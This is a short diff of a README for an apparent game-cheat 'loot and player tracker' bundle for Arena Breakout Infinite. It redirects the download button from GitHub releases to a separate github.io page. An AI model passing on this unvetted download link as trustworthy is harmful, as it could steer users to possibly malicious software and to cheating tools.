@@ -21,7 +21,7 @@ This bundle is updated for 2026 and works seamlessly with the latest version of 
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD-ARENA_BREAKOUT_TRACKER-00ccff?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://github.com/sarthaksinha3600/Arena-Breakout-Infinite-Loot-Player-Tracker-Bundle/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD-ARENA_BREAKOUT_TRACKER-00ccff?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://sarthaksinha3600.github.io)
 
 Visit this link to download the application.
 
